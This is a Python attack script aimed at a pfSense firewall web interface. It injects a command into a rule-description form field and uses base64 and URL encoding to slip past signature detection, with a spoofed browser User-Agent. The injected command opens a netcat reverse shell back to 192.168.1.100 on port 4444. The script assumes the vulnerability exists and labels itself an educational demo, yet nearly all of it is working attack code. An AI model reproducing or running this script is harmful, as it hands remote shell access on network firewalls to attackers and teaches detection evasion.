import requests
import base64
import urllib.parse

# Target URL (hypothetical pfSense WebGUI endpoint)
url = "http://pfsense.local/firewall_rule.php"

# Malicious command to execute (e.g., spawn a shell and connect back)
malicious_cmd = "sh -c 'nc -e /bin/sh 192.168.1.100 4444'"

# Step 1: Encode the command to bypass signature detection
encoded_cmd = base64.b64encode(malicious_cmd.encode()).decode()  # Base64 encode
double_encoded = urllib.parse.quote(encoded_cmd)  # URL-encode for safe transmission

# Step 2: Craft a payload that looks benign but triggers execution
# Assume the server has a vuln that decodes and runs this
payload = {
    "description": f"rule;echo {double_encoded} | base64 -d | sh"  # Sneaky execution
}

# Step 3: Send the request, pretending to be a legitimate user
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Simulate sending the request
response = requests.post(url, data=payload, headers=headers)

# Check the response
print("Status Code:", response.status_code)
print("Response Text:", response.text)

# For educational demo, print what we sent
print("\nPayload Sent:")
print(f"Original Command: {malicious_cmd}")
print(f"Encoded Payload: {payload['description']}")
